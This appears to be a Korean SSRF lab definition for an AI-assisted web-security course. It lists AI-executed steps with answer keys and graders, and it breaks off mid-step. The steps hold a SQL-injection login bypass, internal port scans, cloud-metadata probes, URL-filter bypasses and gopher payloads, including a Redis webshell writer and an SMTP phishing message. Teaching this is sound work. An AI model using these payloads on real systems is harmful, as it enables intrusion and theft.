lab_id: web-vuln-ai-week11
title: SSRF (Server-Side Request Forgery) 실습 (AI 지원)
version: ai
course: web-vuln-ai
week: 11
description: 서버 측 요청 위조를 통해 내부 네트워크 자원에 접근하고, IP 우회, DNS Rebinding, 프로토콜 활용 기법을 실습합니다.
  AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- SSRF 공격 벡터와 내부 네트워크 접근 기법을 이해한다
- 다양한 SSRF 우회 기법(IP 변환, URL 파싱 혼동)을 학습한다
- SSRF 방어 기법과 allowlist 기반 검증을 실습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: JuiceShop(:3000)에서 URL을 입력받아 서버가 요청하는 기능을 찾으시오. 프로필 이미지 URL, 파일 다운로드,
    피드백 링크 등 외부 URL을 처리하는 엔드포인트를 탐색하라.
  hint: JuiceShop의 /profile 이미지 업로드, /api/Feedbacks/, /rest/products/search 등을 확인하세요.
    URL 파라미터가 있는 엔드포인트를 찾으세요.
  category: recon
  points: 8
  answer: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
    | cut -d''"'' -f4) && echo ''=== Feedbacks API ==='' && curl -s http://10.20.30.80:3000/api/Feedbacks/
    -H "Authorization: Bearer $TOKEN" | head -c 300 && echo '''' && echo ''=== Profile
    Image ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' http://10.20.30.80:3000/profile
    -H "Authorization: Bearer $TOKEN"'
  answer_detail: SSRF 공격의 첫 단계는 서버가 사용자 제공 URL로 HTTP 요청을 보내는 기능을 찾는 것입니다. 이미지 로더,
    URL 미리보기, 웹훅, PDF 생성기, RSS 리더 등이 대표적인 SSRF 벡터입니다.
  verify:
    type: output_contains
    expect: Feedbacks
    field: stdout
  target_vm: attacker
  script: 'TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
    application/json'' -d ''{"email":"'' or 1=1--","password":"a"}'' | grep -o ''"token":"[^"]*"''
    | cut -d''"'' -f4) && echo ''=== Feedbacks API ==='' && curl -s http://10.20.30.80:3000/api/Feedbacks/
    -H "Authorization: Bearer $TOKEN" | head -c 300 && echo '''' && echo ''=== Profile
    Image ==='' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' http://10.20.30.80:3000/profile
    -H "Authorization: Bearer $TOKEN"'
  risk_level: low
  bastion_prompt: JuiceShop(:3000)에서 URL을 입력받아 서버가 요청하는 기능을 찾으시오해줘
- order: 2
  instruction: SSRF를 이용하여 서버 내부의 포트를 스캔하시오. localhost의 주요 포트(22, 80, 3000, 3306, 8080,
    9200)에 대해 열린 포트를 확인하라.
  hint: 각 포트에 대해 curl --max-time 2로 접근하고 응답 코드와 시간을 확인하세요. 빠른 응답(연결 거부)과 타임아웃(방화벽
    차단)을 구분합니다.
  category: exploit
  points: 12
  answer: 'echo ''=== SSRF Internal Port Scan ==='' && for PORT in 22 80 443 3000
    3306 5432 6379 8080 9200; do echo -n "Port $PORT: " && curl -s -o /dev/null --max-time
    2 -w ''HTTP:%{http_code} time:%{time_total}s'' http://10.20.30.80:$PORT/ 2>/dev/null
    && echo ''''; done && echo ''=== Port Scan Complete ==='''
  answer_detail: SSRF를 이용한 내부 포트 스캔에서 HTTP 200/302는 서비스가 열린 것, 빠른 000 응답은 포트가 닫힌 것,
    타임아웃은 방화벽이 차단한 것입니다. 80(Apache), 3000(JuiceShop), 8080(DVWA)이 열려 있어야 합니다.
  verify:
    type: output_contains
    expect: Port Scan Complete
    field: stdout
  target_vm: attacker
  script: 'echo ''=== SSRF Internal Port Scan ==='' && for PORT in 22 80 443 3000
    3306 5432 6379 8080 9200; do echo -n "Port $PORT: " && curl -s -o /dev/null --max-time
    2 -w ''HTTP:%{http_code} time:%{time_total}s'' http://10.20.30.80:$PORT/ 2>/dev/null
    && echo ''''; done && echo ''=== Port Scan Complete ==='''
  risk_level: medium
  bastion_prompt: SSRF를 이용하여 서버 내부의 포트를 스캔하시오. localhost의 주요 포트(22, 80, 3000, 3306,
    8080, 9200)에 대해 열린 포트를 확인해줘
- order: 3
  instruction: 클라우드 메타데이터 서비스 접근을 시뮬레이션하시오. SSRF로 http://169.254.169.254/latest/meta-data/
    (AWS 메타데이터 IP)에 접근을 시도하라.
  hint: curl --max-time 3 http://169.254.169.254/latest/meta-data/ 로 접근하세요. 실제 AWS가
    아니므로 타임아웃이 발생하지만, 요청이 나가는 것 자체가 위험합니다.
  category: exploit
  points: 12
  answer: 'echo ''=== Cloud Metadata SSRF Simulation ==='' && echo ''[AWS 169.254.169.254]''
    && curl -s -o /dev/null -w ''HTTP:%{http_code} time:%{time_total}s'' --max-time
    3 http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo '''' && echo ''[GCP
    metadata.google.internal]'' && curl -s -o /dev/null -w ''HTTP:%{http_code} time:%{time_total}s''
    --max-time 3 -H ''Metadata-Flavor: Google'' http://metadata.google.internal/computeMetadata/v1/
    2>/dev/null && echo '''' && echo ''=== Metadata SSRF Test Complete ==='''
  answer_detail: AWS/GCP/Azure의 인스턴스 메타데이터 서비스(169.254.169.254)는 IAM 역할의 임시 자격 증명을
    제공합니다. SSRF로 이 주소에 접근하면 클라우드 계정 전체가 탈취될 수 있습니다. Capital One 해킹(2019년, 1억명 개인정보
    유출)이 대표 사례입니다.
  verify:
    type: output_contains
    expect: Metadata SSRF Test Complete
    field: stdout
  target_vm: attacker
  script: 'echo ''=== Cloud Metadata SSRF Simulation ==='' && echo ''[AWS 169.254.169.254]''
    && curl -s -o /dev/null -w ''HTTP:%{http_code} time:%{time_total}s'' --max-time
    3 http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo '''' && echo ''[GCP
    metadata.google.internal]'' && curl -s -o /dev/null -w ''HTTP:%{http_code} time:%{time_total}s''
    --max-time 3 -H ''Metadata-Flavor: Google'' http://metadata.google.internal/computeMetadata/v1/
    2>/dev/null && echo '''' && echo ''=== Metadata SSRF Test Complete ==='''
  risk_level: medium
  bastion_prompt: 클라우드 메타데이터 서비스 접근을 시뮬레이션하시오. SSRF로 http://169.254.169.254/latest/meta-data/
    (AWS 메타데이터 IP)에 접근을 시도해줘
- order: 4
  instruction: IP 주소 우회 기법을 테스트하시오. localhost를 10진수(2130706433), 16진수(0x7f000001),
    축약형(127.1) 등으로 변환하여 SSRF 필터를 우회 가능한지 확인하라.
  hint: 127.0.0.1 = 2130706433(10진수) = 0x7f000001(16진수) = 127.1(축약). curl http://2130706433:3000/
    형태로 직접 접근을 테스트하세요.
  category: exploit
  points: 12
  answer: echo '=== IP Bypass Techniques ===' && echo '[Standard] 127.0.0.1:3000'
    && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 http://127.0.0.1:3000/
    && echo '' && echo '[Decimal] 2130706433' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
    --max-time 3 http://2130706433:3000/ 2>/dev/null && echo '' && echo '[Hex] 0x7f000001'
    && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 http://0x7f000001:3000/
    2>/dev/null && echo '' && echo '[Short] 127.1' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
    --max-time 3 http://127.1:3000/ 2>/dev/null && echo '' && echo '[IPv6] ::1' &&
    curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 http://[::1]:3000/ 2>/dev/null
    && echo '' && echo '=== IP Bypass Test Complete ==='
  answer_detail: SSRF 필터가 '127.0.0.1'이나 'localhost' 문자열만 차단하면, IP 주소를 다양한 표현으로 변환하여
    우회할 수 있습니다. 10진수(2130706433), 16진수(0x7f000001), 8진수(0177.0.0.1), 축약(127.1), IPv6(::1)
    등이 모두 같은 loopback 주소입니다.
  verify:
    type: output_contains
    expect: IP Bypass Test Complete
    field: stdout
  target_vm: attacker
  script: echo '=== IP Bypass Techniques ===' && echo '[Standard] 127.0.0.1:3000'
    && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 http://127.0.0.1:3000/
    && echo '' && echo '[Decimal] 2130706433' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
    --max-time 3 http://2130706433:3000/ 2>/dev/null && echo '' && echo '[Hex] 0x7f000001'
    && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 http://0x7f000001:3000/
    2>/dev/null && echo '' && echo '[Short] 127.1' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
    --max-time 3 http://127.1:3000/ 2>/dev/null && echo '' && echo '[IPv6] ::1' &&
    curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 http://[::1]:3000/ 2>/dev/null
    && echo '' && echo '=== IP Bypass Test Complete ==='
  risk_level: medium
  bastion_prompt: IP 주소 우회 기법을 테스트하시오. localhost를 10진수(2130706433), 16진수(0x7f000001),
    축약형(127.1) 등으로 변환하여 SSRF 필터를 우회 가능한지 확인해줘
- order: 5
  instruction: URL 파싱 혼동 기법으로 SSRF 필터를 우회하시오. URL에 @를 사용하여 호스트를 위장하라.
  hint: http://expected-host@evil-host/ 형태를 사용하면, 필터는 expected-host를 확인하지만 실제 요청은
    evil-host로 갑니다. http://google.com@10.20.30.80:3000/ 를 테스트하세요.
  category: exploit
  points: 12
  answer: echo '=== URL Parsing Confusion ===' && echo '[@-based] http://google.com@10.20.30.80:3000/'
    && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 'http://google.com@10.20.30.80:3000/'
    && echo '' && echo '[#fragment] http://evil.com#@10.20.30.80:3000/' && curl -s
    -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 'http://10.20.30.80:3000/#@evil.com'
    && echo '' && echo '=== URL Parsing Test Complete ==='
  answer_detail: 'URL 스펙에서 @는 사용자 정보(user:pass@host)를 구분합니다. 필터가 @앞의 호스트명만 검증하면 @뒤의
    실제 호스트로 요청이 전송됩니다. #fragment, 백슬래시, 유니코드 등도 파서마다 다르게 해석되어 우회에 활용됩니다.'
  verify:
    type: output_contains
    expect: URL Parsing Test Complete
    field: stdout
  target_vm: attacker
  script: echo '=== URL Parsing Confusion ===' && echo '[@-based] http://google.com@10.20.30.80:3000/'
    && curl -s -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 'http://google.com@10.20.30.80:3000/'
    && echo '' && echo '[#fragment] http://evil.com#@10.20.30.80:3000/' && curl -s
    -o /dev/null -w 'HTTP:%{http_code}' --max-time 3 'http://10.20.30.80:3000/#@evil.com'
    && echo '' && echo '=== URL Parsing Test Complete ==='
  risk_level: medium
  bastion_prompt: URL 파싱 혼동 기법으로 SSRF 필터를 우회하시오. URL에 @를 사용하여 호스트를 위장해줘
- order: 6
  instruction: DNS Rebinding의 원리를 분석하시오. DNS TTL을 확인하고, Rebinding 공격의 3단계(검증-전환-요청)를
    설명하라.
  hint: nslookup으로 대상 서버의 DNS를 조회하세요. TTL이 0이면 DNS Rebinding에 취약합니다.
  category: exploit
  points: 10
  answer: 'echo ''=== DNS Rebinding Analysis ==='' && echo ''[DNS Lookup]'' && nslookup
    10.20.30.80 2>/dev/null || echo ''Direct IP - no DNS resolution needed'' && echo
    '''' && echo ''[DNS Rebinding 3-Stage Attack]'' && echo ''Stage 1: evil.com resolves
    to EXTERNAL_IP (passes filter)'' && echo ''Stage 2: TTL expires, evil.com now
    resolves to 127.0.0.1'' && echo ''Stage 3: Server makes request to 127.0.0.1 (internal
    access)'' && echo '''' && echo ''[Defense Requirements]'' && echo ''- Resolve
    DNS BEFORE and AFTER filter check'' && echo ''- Block private IP ranges after
    resolution'' && echo ''- Set minimum DNS TTL in resolver'' && echo ''=== DNS Rebinding
    Analysis Complete ==='''
  answer_detail: DNS Rebinding은 SSRF 필터가 DNS 조회 결과의 IP를 검증할 때, 검증 시점과 실제 요청 시점의 DNS
    응답을 다르게 하여 우회합니다. TTL=0으로 설정된 악성 DNS 서버가 필요합니다. 방어하려면 요청 전후로 DNS를 재검증하고 내부 IP
    대역을 차단해야 합니다.
  verify:
    type: output_contains
    expect: DNS Rebinding Analysis Complete
    field: stdout
  target_vm: attacker
  script: 'echo ''=== DNS Rebinding Analysis ==='' && echo ''[DNS Lookup]'' && nslookup
    10.20.30.80 2>/dev/null || echo ''Direct IP - no DNS resolution needed'' && echo
    '''' && echo ''[DNS Rebinding 3-Stage Attack]'' && echo ''Stage 1: evil.com resolves
    to EXTERNAL_IP (passes filter)'' && echo ''Stage 2: TTL expires, evil.com now
    resolves to 127.0.0.1'' && echo ''Stage 3: Server makes request to 127.0.0.1 (internal
    access)'' && echo '''' && echo ''[Defense Requirements]'' && echo ''- Resolve
    DNS BEFORE and AFTER filter check'' && echo ''- Block private IP ranges after
    resolution'' && echo ''- Set minimum DNS TTL in resolver'' && echo ''=== DNS Rebinding
    Analysis Complete ==='''
  risk_level: medium
  bastion_prompt: attacker VM에서 DNS Rebinding의 원리를 분석 작업을 수행해줘
- order: 7
  instruction: gopher:// 프로토콜을 이용한 SSRF 페이로드를 구성하시오. Redis, MySQL 등 내부 서비스를 공격하는 gopher
    페이로드를 작성하라(전송 금지, 구조 분석만).
  hint: gopher://127.0.0.1:6379/_SET%20key%20value 형태입니다. 각 서비스별 페이로드를 /tmp/ssrf_gopher.txt에
    저장하세요.
  category: exploit
  points: 10
  answer: 'cat > /tmp/ssrf_gopher.txt << ''EOF''

    === Gopher SSRF Payloads (학습 목적) ===


    [Redis (6379) - 웹쉘 작성]

    gopher://127.0.0.1:6379/_SET%20webshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0AQUIT%0D%0A


    [MySQL (3306) - 인증 우회 쿼리]

    gopher://127.0.0.1:3306/_%00%00%00%03SELECT%20version()


    [SMTP (25) - 메일 발송]

    gopher://127.0.0.1:25/_HELO%20attacker%0D%0AMAIL%20FROM%3Aevil@test.com%0D%0ARCPT%20TO%3Avictim@test.com%0D%0ADATA%0D%0APhishing%20content%0D%0A.%0D%0A

    EOF

    echo ''Gopher payloads saved:'' && cat /tmp/ssrf_gopher.txt'
  answer_detail: gopher:// 프로토콜은 TCP 소켓에 임의의 바이트를 전송할 수 있어 SSRF에서 매우 위험합니다. Redis에는
    SET/CONFIG 명령으로 웹쉘을 작성하고, MySQL에는 인증 없이 쿼리를 실행하며, SMTP에는 피싱 메일을 발송할 수 있습니다.
  verify:
    type: output_contains
    expect: Gopher payloads saved
    field: stdout
  target_vm: attacker
  script: 'cat > /tmp/ssrf_gopher.txt << ''EOF''

    === Gopher SSRF Payloads (학습 목적) ===


    [Redis (6379) - 웹쉘 작성]

    gopher://127.0.0.1:6379/_SET%20webshell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0ACONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASAVE%0D%0AQUIT%0D%0A


    [MySQL (3306) - 인증 우회 쿼리]

    gopher://127.0.0.1:3306/_%00%00%00%03SELECT%20version()


    [SMTP (25) - 메일 발송]

    gopher://127.0.0.1:25/_HELO%20attacker%0D%0AMAIL%20FROM%3Aevil@test.com%0D%0ARCPT%20TO%3Avictim@test.com%0D%0ADATA%0D%0APhishing%20content%0D%0A.%0D%0A

    EOF

    echo ''Gopher payloads saved:'' && cat /tmp/ssrf_gopher.txt'
  risk_level: medium
  bastion_prompt: attacker VM에서 cat으로 gopher:// 프로토콜을 이용한 SSRF 페이로드를 구성 작업을 수행해줘
- order: 8
  instruction: SSRF 방어를 위한 allowlist 검증을 설계하시오. 차단해야 할 IP 대역과 프로토콜을 정리하고, ModSecurity의
    SSRF 관련 차단 동작을 확인하라.
  hint: 사설 IP(10.x, 172.16.x, 192.168.x), 루프백(127.x), 메타데이터(169.254.x) 대역을 정리하세요.
  category: defense
  points: 10
  answer: 'echo ''=== SSRF Defense Allowlist Design ==='' && echo ''[Block IP Ranges]''
    && echo ''  127.0.0.0/8    - Loopback'' && echo ''  10.0.0.0/8     - Private Class
    A'' && echo ''  172.16.0.0/12  - Private Class B'' && echo ''  192.168.0.0/16
    - Private Class C'' && echo ''  169.254.0.0/16 - Link-local (metadata)'' && echo
    ''  0.0.0.0/8      - This network'' && echo ''  ::1/128        - IPv6 loopback''
    && echo '''' && echo ''[Block Protocols]'' && echo ''  gopher://, file://, dict://,
    ftp://'' && echo '''' && echo ''[WAF Test]'' && curl -s -o /dev/null -w ''Port
    80 internal URL: HTTP:%{http_code}'' --max-time 3 ''http://10.20.30.80:80/?url=http://127.0.0.1/''
    && echo '''' && echo ''=== SSRF Defense Design Complete ==='''
  answer_detail: SSRF 방어의 핵심은 allowlist 기반 URL 검증입니다. 블랙리스트(127.0.0.1 차단)는 IP 변환,
    DNS Rebinding 등으로 우회됩니다. 반드시 DNS 조회 후 IP가 사설 대역인지 확인하고, HTTP 리다이렉트를 따라가지 않으며,
    허용된 프로토콜(https만)과 도메인만 허가해야 합니다.
  verify:
    type: output_contains
    expect: SSRF Defense Design Complete
    field: stdout
  target_vm: attacker
  script: 'echo ''=== SSRF Defense Allowlist Design ==='' && echo ''[Block IP Ranges]''
    && echo ''  127.0.0.0/8    - Loopback'' && echo ''  10.0.0.0/8     - Private Class
